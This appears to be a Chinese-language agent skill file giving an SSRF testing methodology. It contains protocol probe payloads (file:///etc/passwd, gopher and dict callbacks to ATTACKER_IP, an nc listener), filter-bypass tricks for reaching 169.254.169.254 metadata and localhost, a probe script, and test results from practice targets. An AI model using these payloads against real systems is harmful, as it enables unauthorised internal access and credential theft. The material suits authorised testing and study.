---
name: 'ssrf-protocol-matrix'
description: 'SSRF 协议测试矩阵：file/http/netdoc/gopher 逐个试 → 能力分级 L1-L6 → 关键问题检查表'
whenToUse: '目标有 SSRF 且内网地址/元数据被过滤时：先跑协议矩阵定能力，再按绕过节过一遍黑名单。'
metadata: { domain: web, tier: T1 }
---


# SSRF 协议测试矩阵

> 每次发现 SSRF 必须做的标准动作

## 1. 支持协议探测

```bash
# 用外部服务器监听 + 逐个协议试
nc -lvnp 9999

# 测试列表（按优先级）
file:///etc/passwd          # 本地文件读取 — Linux
file:///C:/Windows/win.ini  # 本地文件读取 — Windows
http://ATTACKER_IP:9999/    # 外网 HTTP 请求
https://ATTACKER_IP:9999/   # HTTPS
gopher://ATTACKER_IP:9999/_ # Gopher — 可构造任意 TCP 包
netdoc:///etc/passwd        # Java netdoc — 同 file://
dict://ATTACKER_IP:9999/    # Dict 协议
jar://                      # Java JAR — 可能远程加载类
ftp://                       # FTP — 可能读取/写入
```text

## 2. SSRF 能力分级

| 等级 | 能力 | 判定方法 |
|------|------|---------|
| L1 | 读文件 | `file:///etc/passwd` 返回内容 |
| L2 | 读目录 | `file:///etc/`（末尾 `/`）返回文件列表 |
| L3 | HTTP 外网 | `http://AttackerIP/` 收到回调 |
| L4 | HTTP 内网 | `http://127.0.0.1:PORT/` 返回内容 |
| L5 | CRLF 注入 | `http://AttackerIP/%0d%0aInjected:yes` — 注意 Java 会 URL 编码 CRLF |
| L6 | Gopher | `gopher://AttackerIP/_DATA` 发送原始 TCP |

## 黑名单/白名单绕过（实战）

> Nimbus 实战：字符串黑名单被十进制 IP 2130706433 绕过直达元数据服务；"floci" 子串整 URL 匹配拦截；重定向不被跟随但会被检查

- **十进制 IP**：`2130706433` = 127.0.0.1（`http://2130706433/` 绕过只过滤 `127.0.0.1`/`localhost` 的黑名单，直达元数据服务）；IMDS 用 `2852039166` = 169.254.169.254
- **后缀检查绕过**：要求 URL 以 `.yaml` 结尾时，用 query 技巧 `?x.yaml` / 路径参数 `/a.yaml?x=` 或 `#.yaml` 伪造后缀（Nimbus 实测：`?x.yaml` 通过）
- **八进制 / 十六进制 IP**：`0177.0.0.1`（八进制）、`0x7f000001`（十六进制）→ 127.0.0.1
- **`127.1` 缩写**：IP 简写，`127.1` 解析为 127.0.0.1
- **URL userinfo `@`**：`http://127.0.0.1@evil.com/` — 解析器取 `@` 后为真实目标，黑名单只匹配 host 前缀则被绕过
- **DNS rebinding**：域名首次解析为公网 IP（过白名单），后续解析为内网 IP（打内网）
- **302 重定向链**：外部域名 → 302 → 内网地址；部分实现跟随重定向但不复查黑名单
- **URL 编码变体**：`%31%32%37.0.0.1`、`127.0.0.1%00`、双重编码、混合大小写十六进制

## 3. 每个协议的关键问题

```text
[ ] file:// → 能读哪些文件？（用户的 home？/etc？root-owned？）
[ ] file:// → 能列目录吗？（末尾 /）
[ ] http:// → 能出外网吗？（AttackerIP 收到回调？）
[ ] http:// → 能访问 localhost 吗？（127.0.0.1:PORT）
[ ] http:// → 能访问云 metadata 吗？（169.254.169.254）
[ ] http:// → 支持 POST/PUT 吗？（通常不支持）
[ ] http:// → 能设置 Cookie/Header 吗？（通常不能）
[ ] http:// → 跟随重定向吗？（Java URLConnection 默认跟随）
[ ] gopher:// → 可用吗？（构造任意 TCP 流的关键）
[ ] ftp:// → 支持上传吗？（通常不支持 STOR）
```text

## 4. DevArea 实测结果

（DevArea/Apache CXF 环境实测）

| 协议 | 结果 | 备注 |
|------|------|------|
| `file://` | ✅ 读文件/目录 | 可读 world-readable 文件，可列目录 |
| `http://` | ✅ 内外网均可 | 仅 GET，不跟随重定向（？），不传 Cookie |
| `netdoc://` | ✅ 同 file:// | Java 特有 |
| `gopher://` | ❌ unknown protocol | CXF 不支持 |
| `data://` | ❌ | CXF 不支持 |
| `jar://` | ❌ 无返回 | 可能不支持或文件不存在 |

## 5. 快速模板

```python
# SSRF 协议探测脚本
PROTOCOLS = [
    ("file:///etc/passwd", "File read"),
    ("file:///etc/", "Dir listing"),
    ("http://ATTACKER:9999/test", "HTTP outbound"),
    ("http://127.0.0.1:80/", "HTTP internal"),
    ("gopher://ATTACKER:9999/_test", "Gopher"),
]
for url, desc in PROTOCOLS:
    trigger_ssrf(url)
    print(f"{desc}: check listener")
```text
